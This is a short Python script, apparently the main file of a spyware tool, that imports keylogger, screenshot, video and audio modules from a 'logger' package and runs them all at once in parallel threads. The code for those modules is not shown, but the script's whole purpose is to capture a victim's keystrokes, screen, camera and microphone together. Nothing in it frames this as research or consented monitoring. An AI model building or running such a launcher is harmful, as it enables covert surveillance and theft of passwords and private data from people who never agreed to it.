import threading
from logger import keylogger, screenshot, video, audio

def main():
    threads = [
        threading.Thread(target=keylogger.start),
        threading.Thread(target=screenshot.capture_screenshot),
        threading.Thread(target=video.start_recording),
        threading.Thread(target=audio.record_audio)
    ]

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
